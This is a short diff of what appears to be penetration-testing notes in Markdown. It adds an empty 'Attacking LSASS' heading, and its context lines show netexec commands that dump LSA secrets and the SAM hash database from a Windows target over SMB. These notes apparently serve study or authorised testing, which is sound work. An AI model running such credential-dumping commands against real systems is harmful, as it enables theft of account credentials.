@@ -53,3 +53,7 @@ netexec smb <TARGET IP> --local-auth -u <username> -p <password> --lsa
 ```bash
 netexec smb <TARGET IP> --local-auth -u <username> -p <password> --sam
 ```
+
+---
+## Attacking LSASS
+
